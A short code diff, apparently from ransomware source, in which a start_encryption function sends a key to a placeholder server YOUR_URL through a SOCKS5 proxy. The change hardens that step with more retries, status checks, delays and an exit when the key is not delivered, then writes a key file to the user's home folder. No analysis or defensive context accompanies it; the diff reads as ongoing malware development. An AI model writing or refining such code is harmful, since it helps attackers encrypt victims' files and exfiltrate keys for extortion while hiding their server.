@@ -385,12 +385,18 @@ def start_encryption():
             "http": f"socks5h://{YOUR_PROXY}",
             "https": f"socks5h://{YOUR_PROXY}",
         }
-        for _ in range(3):
+        key_sent_successfully = False
+        for _ in range(5):
             try:
-                requests.post(YOUR_URL, data=data, proxies=proxies, timeout=30)
-                break
-            except requests.exceptions.RequestException as e:
+                response = requests.post(YOUR_URL, data=data, proxies=proxies, timeout=30)
+                if response.status_code == 200:
+                    key_sent_successfully = True
+                    break
+            except requests.exceptions.RequestException:
+                time.sleep(10)
                 continue
+        if not key_sent_successfully:
+            sys.exit(4)
         with open(
             os.path.join(rf"C:\Users\{getpass.getuser()}", "key.sha256"), "wb"
         ) as f:
@@ -798,6 +804,7 @@ if __name__ == "__main__":
     else:
 
         start_encryption()
+
 
 
 
